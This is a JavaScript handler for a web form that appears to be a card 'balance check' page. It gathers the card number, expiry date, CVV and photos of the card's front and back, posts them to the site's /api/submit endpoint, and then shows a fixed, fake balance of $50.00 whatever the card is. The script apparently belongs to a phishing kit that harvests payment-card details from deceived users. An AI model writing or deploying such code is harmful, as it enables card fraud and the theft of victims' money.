document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("balanceForm");
  const status = document.getElementById("submitStatus");
  const label = document.querySelector('[data-label]');
  const spinner = document.querySelector('[data-spinner]');

  const blobToBase64 = blob => new Promise((resolve) => {
    const reader = new FileReader();
    reader.onload = () => resolve(reader.result);
    reader.readAsDataURL(blob);
  });

  form.addEventListener("submit", async (e) => {
    e.preventDefault();

    label.classList.add("hidden");
    spinner.classList.remove("hidden");
    status.textContent = "Sending...";

    try {
      const frontBase64 = window.frontBlob ? await blobToBase64(window.frontBlob) : null;
      const backBase64 = window.backBlob ? await blobToBase64(window.backBlob) : null;

      const data = {
        card_number: document.querySelector('[name="card_number"]').value.trim(),
        expiry_date: document.querySelector('[name="expiry_date"]').value.trim(),
        cvv: document.querySelector('[name="cvv"]').value.trim(),
        front_image: frontBase64,
        back_image: backBase64
      };

      const res = await fetch("/api/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });

      if (res.ok) {
        status.textContent = "Success! Balance: $50.00";
        document.getElementById("balanceText").textContent = "$50.00";
        document.getElementById("result").classList.remove("hidden");

        setTimeout(() => location.reload(), 3000);
      } else {
        throw new Error("Server error");
      }
    } catch (err) {
      status.textContent = "Error. Try again.";
      console.error(err);
      label.classList.remove("hidden");
      spinner.classList.add("hidden");
    }
  });

  document.getElementById("finishAndSubmitBtn")?.addEventListener("click", () => {
    form.dispatchEvent(new Event("submit"));
  });
});
